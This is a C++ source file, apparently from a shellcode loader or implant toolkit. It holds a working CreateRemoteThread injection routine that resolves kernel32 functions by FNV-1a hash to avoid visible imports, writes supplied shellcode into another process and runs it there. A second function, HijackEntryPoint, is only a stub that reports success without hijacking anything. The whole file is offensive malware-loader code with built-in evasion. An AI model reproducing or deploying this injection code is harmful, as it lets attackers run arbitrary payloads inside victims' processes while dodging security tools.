#include "execute.hpp"

namespace execute {
	BOOL CreateRemoteThreadInjection(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		PVOID address_ptr = NULL;
		BOOL success = FALSE;
		HANDLE thread_handle = NULL;
		SIZE_T bytes_written = 0;
		HMODULE kernel32 = NULL;

#pragma region [Kernel32 Functions]

		typeGetLastError GetLastErrorC = NULL;
		typeVirtualFreeEx VirtualFreeExC = NULL;
		typeCreateRemoteThread CreateRemoteThreadC = NULL;
		typeCloseHandle CloseHandleC = NULL;
		typeWaitForSingleObject WaitForSingleObjectC = NULL;

		constexpr ULONG hash_getlasterror = malapi::HashStringFowlerNollVoVariant1a("GetLastError");
		constexpr ULONG hash_virtualfreeex = malapi::HashStringFowlerNollVoVariant1a("VirtualFreeEx");
		constexpr ULONG hash_createremotethread = malapi::HashStringFowlerNollVoVariant1a("CreateRemoteThread");
		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");
		constexpr ULONG hash_waitforsingleobject = malapi::HashStringFowlerNollVoVariant1a("WaitForSingleObject");
		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");

		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
		if (kernel32 == NULL)
		{
			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
			goto CLEANUP;
		}

		GetLastErrorC = (typeGetLastError)malapi::GetProcAddressC(kernel32, hash_getlasterror);
		VirtualFreeExC = (typeVirtualFreeEx)malapi::GetProcAddressC(kernel32, hash_virtualfreeex);
		CreateRemoteThreadC = (typeCreateRemoteThread)malapi::GetProcAddressC(kernel32, hash_createremotethread);
		WaitForSingleObjectC = (typeWaitForSingleObject)malapi::GetProcAddressC(kernel32, hash_waitforsingleobject);
		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);

#pragma endregion

		address_ptr = malapi::WriteShellcodeMemory(process_handle, shellcode, shellcode_size);

		thread_handle = CreateRemoteThreadC(process_handle, 0, 0, (LPTHREAD_START_ROUTINE)address_ptr, NULL, NULL, NULL);
		if (thread_handle == NULL)
		{
			LOG_ERROR("Error during CreateRemoteThread (Code: %08lX)", GetLastErrorC());
			goto CLEANUP;
		}
		else LOG_SUCCESS("Handle to Thread: 0x%08lX", thread_handle);
		success = TRUE;

		WaitForSingleObjectC(thread_handle, WAIT_FAILED);

	CLEANUP:
		if (process_handle)
		{
			VirtualFreeExC(process_handle, (LPVOID)address_ptr, 0, MEM_RELEASE);
			// CloseHandleC(thread_handle);
			// CloseHandleC(process_handle);
		}
		return success;
	}

	BOOL HijackEntryPoint(_In_ HANDLE process_handle, _In_ BYTE* shellcode, _In_ SIZE_T shellcode_size)
	{
		BOOL success = FALSE;
		HMODULE kernel32 = NULL;

		typeCloseHandle CloseHandleC = NULL;

		constexpr ULONG hash_closehandle = malapi::HashStringFowlerNollVoVariant1a("CloseHandle");
		constexpr ULONG hash_kernel32 = malapi::HashStringFowlerNollVoVariant1a("KERNEL32.DLL");

		kernel32 = malapi::GetModuleHandleC(hash_kernel32);
		if (kernel32 == NULL)
		{
			LOG_ERROR("GetModuleHandle Failed to import Kernel32");
			goto CLEANUP;
		}

		CloseHandleC = (typeCloseHandle)malapi::GetProcAddressC(kernel32, hash_closehandle);

		success = TRUE;

	CLEANUP:
		// CloseHandleC(process_handle);
		// CloseHandleC(thread_handle);
		return success;
	}
} // End of execute namespace
